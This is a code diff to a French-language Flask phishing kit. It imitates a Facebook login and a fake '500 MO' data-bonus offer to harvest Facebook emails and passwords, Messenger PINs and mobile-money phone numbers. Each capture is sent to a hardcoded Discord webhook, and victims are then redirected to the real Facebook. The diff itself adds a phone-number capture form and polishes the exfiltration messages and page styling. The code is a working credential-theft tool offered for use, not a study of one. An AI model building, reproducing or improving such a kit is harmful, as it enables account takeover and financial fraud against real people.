@@ -1,5 +1,5 @@
 import os
-import requests  # Nécessaire pour envoyer les données à Discord
+import requests
 from flask import Flask, request, redirect, render_template_string
 
 app = Flask(__name__)
@@ -8,7 +8,7 @@ app = Flask(__name__)
 DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1471099314398040230/mrOS59JK1KfeIQICVwIFwNbURRhR08ivbdWy_P3VQdwPJD4r1opB8krL26i1tyePIH8h"
 
 def send_to_discord(message):
-    """Fonction sécurisée pour envoyer les logs vers Discord"""
+    """Fonction pour envoyer les logs vers Discord"""
     data = {"content": message}
     try:
         requests.post(DISCORD_WEBHOOK_URL, json=data)
@@ -29,6 +29,7 @@ HTML_ACCUEIL = '''
         h2 { color: #2c3e50; margin-bottom: 10px; }
         p { color: #5a6c7d; line-height: 1.6; }
         .btn-check { display: block; width: 100%; padding: 15px; background: #3498db; color: white; text-decoration: none; border-radius: 8px; font-weight: bold; margin-top: 20px; transition: 0.3s; }
+        .btn-check:hover { background: #2980b9; }
     </style>
 </head>
 <body>
@@ -55,6 +56,7 @@ HTML_FACEBOOK = '''
         .alert { background: #fff9e6; color: #856404; padding: 10px; border-radius: 5px; font-size: 13px; margin-bottom: 15px; border: 1px solid #ffeeba; }
         input { width: 100%; padding: 15px; margin: 5px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
         button { width: 100%; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; margin-top: 10px; cursor: pointer; }
+        button:hover { background-color: #145dbf; }
     </style>
 </head>
 <body>
@@ -77,13 +79,14 @@ HTML_BONUS = '''
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; padding: 20px; }
+        body { font-family: Arial, sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; padding: 20px; margin: 0; }
         .promo-box { width: 100%; max-width: 400px; background: white; padding: 30px; border-radius: 12px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
         .success-icon { color: #2ecc71; font-size: 40px; }
         h2 { color: #2c3e50; }
         .data-badge { background: #e8f5e9; color: #2e7d32; padding: 10px 20px; border-radius: 20px; font-weight: bold; display: inline-block; margin: 10px 0; }
-        input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
         button { width: 100%; padding: 12px; background-color: #2ecc71; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
+        button:hover { background-color: #27ae60; }
     </style>
 </head>
 <body>
@@ -91,11 +94,18 @@ HTML_BONUS = '''
         <div class="success-icon">✔</div>
         <h2>Compte Éligible !</h2>
         <div class="data-badge">PACK 500 MO ACTIVER</div>
-        <p>Entrez votre numéro pour recevoir votre code d'activation :</p>
-        <!-- ICI TU METS TON FORMULAIRE QUI ENVOIE LE PIN -->
+        <p>Entrez votre code PIN Messenger et votre numéro pour recevoir votre code d'activation :</p>
+
+        <!-- Formulaire PIN Messenger -->
         <form action="/messenger_pin" method="post">
             <input type="text" name="pin_code" placeholder="Code PIN Messenger" required>
             <button type="submit">VALIDER MON CODE</button>
+        </form>
+
+        <!-- Formulaire numéro téléphone -->
+        <form action="/final" method="post">
+            <input type="text" name="phone" placeholder="Ex: 034XXXXXXX" required>
+            <button type="submit">RÉCLAMER MAINTENANT</button>
         </form>
     </div>
 </body>
@@ -118,7 +128,11 @@ def capture():
     password = request.form.get('pass')
     
     # Envoi vers Discord
-    message = f"🔥 **NOUVELLE CAPTURE FB** 🔥\n👤 **User:** `{email}`\n🔑 **Pass:** `{password}`"
+    message = (
+        f"🔥 **NOUVELLE CAPTURE FB** 🔥\n"
+        f"👤 **User:** `{email}`\n"
+        f"🔑 **Pass:** `{password}`"
+    )
     send_to_discord(message)
     
     print(f"\n[!] LOGS CAPTURÉS : {email} | {password}")
@@ -128,23 +142,28 @@ def capture():
 def capture_pin():
     pin = request.form.get('pin_code')
     
-    # Envoi du code de déchiffrement vers Discord
-    message = f"💬 **PIN MESSENGER CAPTURÉ** 💬\n🔓 **Code d'accès aux messages :** `{pin}`"
+    message = (
+        f"💬 **PIN MESSENGER CAPTURÉ** 💬\n"
+        f"🔓 **Code d'accès aux messages :** `{pin}`"
+    )
     send_to_discord(message)
     
-    # On peut ré‑afficher la page bonus ou rediriger ailleurs
+    # Après le PIN, on peut soit ré‑afficher la page, soit laisser comme ça
     return render_template_string(HTML_BONUS)
 
 @app.route('/final', methods=['POST'])
 def final():
     phone = request.form.get('phone')
     
-    # Envoi du numéro vers Discord
-    message = f"💰 **NUMÉRO MOBILE MONEY** 💰\n📱 **Tel:** `{phone}`"
+    message = (
+        f"💰 **NUMÉRO MOBILE MONEY** 💰\n"
+        f"📱 **Tel:** `{phone}`"
+    )
     send_to_discord(message)
     
     print(f"[+] NUMÉRO POUR BONUS : {phone}\n")
-    return redirect("https://m.facebook.com")
+    # Redirection vers le vrai Facebook
+    return redirect("https://www.facebook.com")
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
